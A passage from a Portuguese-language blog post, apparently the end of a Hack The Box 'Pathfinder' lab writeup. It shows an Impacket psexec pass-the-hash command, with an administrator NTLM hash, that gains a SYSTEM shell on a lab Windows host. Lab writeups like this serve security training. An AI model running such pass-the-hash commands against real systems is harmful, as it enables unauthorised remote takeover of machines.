└─<span class="nv">$ </span>python3 /usr/share/doc/python3-impacket/examples/psexec.py megacorp.local/administrator@10.10.10.30 <span class="nt">-hashes</span> aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.30.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file vpCRwyDb.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.30.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service btXJ on 10.10.10.30.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service btXJ.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.17763.107]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/htb/htb-pathfinder-6.png" /></p><p>E conseguimos shell como administrador!!! A flag <code class="language-plaintext highlighter-rouge">root.txt</code> se encontra no Desktop do Administrator.</p><p><br /></p><p>E comprometemos o server!! <br /></p><p><img data-proofer-ignore data-src="/img/htb/hackerman.gif" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeups/'>Writeups</a>, <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/starting-point/" class="post-tag no-text-decoration" >Starting point</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/very-easy/" class="post-tag no-text-decoration" >Very Easy</a> <a href="/tags/ad/" class="post-tag no-text-decoration" >AD</a> <a href="/tags/an%C3%A1lise-gr%C3%A1fica/" class="post-tag no-text-decoration" >Análise Gráfica</a> <a href="/tags/kerberos/" class="post-tag no-text-decoration" >Kerberos</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB Pathfinder Writeup - H41stur&url=https://h41stur.github.io/posts/htb-pathfinder-writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB Pathfinder Writeup - H41stur&u=https://h41stur.github.io/posts/htb-pathfinder-writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB Pathfinder Writeup - H41stur&url=https://h41stur.github.io/posts/htb-pathfinder-writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://h41stur.github.io/posts/htb-pathfinder-writeup/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div><div> <script src="https://utteranc.es/client.js" repo="h41stur/h41stur.github.io" issue-term="url" theme="photon-dark" crossorigin="anonymous" async> </script></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/process-injection/">Process Injection 101</a><li><a href="/posts/evasao-av/">Evasão de Antivírus - Princípios Gerais e Abordagens Específicas</a><li><a href="/posts/paper-heap/">Heap Exploitation P.1</a><li><a href="/posts/shellcoding101/">Shellcoding 101</a><li><a href="/posts/replay-sinal-rf/">Uma Jornada no Hardware Hacking: Criando um Clonador de Sinais RF</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-archetype-writeup/"><div class="card-body"> <span class="timeago small" >Sep 5, 2021<i class="unloaded">2021-09-05T21:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB Archetype Writeup</h3><div class="text-muted small"><p> Nome Archetype IP 10.10.10.27 Pontos 0 OS Windows Nível Very Easy ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-shield-writeup/"><div class="card-body"> <span class="timeago small" >Sep 6, 2021<i class="unloaded">2021-09-06T22:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB Shield Writeup</h3><div class="text-muted small"><p> Nome Shield IP 10.10.10.29 Pontos 0 OS Windows Nível Very Easy REC...</p></div></div></a></div><div class="card"> <a href="/posts/htb-oopsie-writeup/"><div class="card-body"> <span class="timeago small" >Sep 5, 2021<i class="unloaded">2021-09-05T21:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB Oopsie Writeup</h3><div class="text-muted small"><p> Nome Oopsie IP 10.10.10.28 Pontos 0 OS Linux Nível Very Easy RECON...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-shield-writeup/" class="btn btn-outline-primary" prompt="Older"><p>HTB Shield Writeup</p></a> <a href="/posts/thm-relevant-writeup/" class="btn btn-outline-primary" prompt="Newer"><p>THM Relevant Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/h41stur">H41stur</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://h41stur.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
